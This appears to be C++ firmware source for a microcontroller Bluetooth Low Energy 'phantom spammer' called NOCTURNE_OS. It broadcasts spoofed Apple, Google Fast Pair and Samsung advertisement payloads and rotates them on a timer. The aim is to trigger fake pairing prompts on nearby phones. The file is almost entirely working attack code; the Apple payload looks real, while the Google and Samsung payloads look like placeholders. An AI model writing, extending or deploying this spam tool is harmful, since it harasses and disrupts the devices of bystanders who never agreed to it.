/*
 * NOCTURNE_OS — BLE Phantom Spammer: rotate Apple / Google / Samsung payloads.
 */
#include "BleManager.h"
#include <NimBLEAdvertising.h>
#include <NimBLEDevice.h>
#include <vector>

// Apple Action (AirPods / Apple TV / Vision Pro) — manufacturer 0x004C
static const uint8_t kPayloadApple[] = {0x4C, 0x00, 0x07, 0x19,
                                        0x07, 0x02, 0x20, 0x75};
static const size_t kPayloadAppleLen = sizeof(kPayloadApple);

// Google Fast Pair — manufacturer-style placeholder for 0x2DFE
static const uint8_t kPayloadGoogle[] = {0xFE, 0x2D, 0x00, 0x00, 0x00, 0x00};
static const size_t kPayloadGoogleLen = sizeof(kPayloadGoogle);

// Samsung (SmartTag / Buds) — manufacturer 0x0075
static const uint8_t kPayloadSamsung[] = {0x75, 0x00, 0x01, 0x02, 0x03, 0x04};
static const size_t kPayloadSamsungLen = sizeof(kPayloadSamsung);

BleManager::BleManager() {}

void BleManager::setPayload(int index) {
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  NimBLEAdvertisementData advData;
  advData.setFlags(0x06);

  const uint8_t *payload = nullptr;
  size_t len = 0;
  switch (index) {
  case 0:
    payload = kPayloadApple;
    len = kPayloadAppleLen;
    break;
  case 1:
    payload = kPayloadGoogle;
    len = kPayloadGoogleLen;
    break;
  case 2:
    payload = kPayloadSamsung;
    len = kPayloadSamsungLen;
    break;
  default:
    payload = kPayloadApple;
    len = kPayloadAppleLen;
    break;
  }
  std::vector<uint8_t> vec(payload, payload + len);
  advData.setManufacturerData(vec);
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start(0, nullptr);
  packetCount_++;
  currentPayloadIndex_ = index;
}

void BleManager::startSpam() { setPayload(0); }

void BleManager::begin() {
  if (active_)
    return;
  NimBLEDevice::init("PHANTOM");
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  pAdvertising->setScanResponse(false);
  startSpam();
  active_ = true;
  lastRotateMs_ = millis();
  Serial.println("[PHANTOM] BLE spam ACTIVE (WiFi off).");
}

void BleManager::stop() {
  if (!active_)
    return;
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  pAdvertising->stop();
  NimBLEDevice::deinit(true);
  active_ = false;
  Serial.println("[PHANTOM] BLE spam STOPPED.");
}

void BleManager::tick() {
  if (!active_)
    return;
  unsigned long now = millis();
  if (now - lastRotateMs_ >= BLE_PHANTOM_ROTATE_MS) {
    lastRotateMs_ = now;
    int next = (currentPayloadIndex_ + 1) % BLE_PHANTOM_PAYLOAD_COUNT;
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->stop();
    setPayload(next);
  }
}
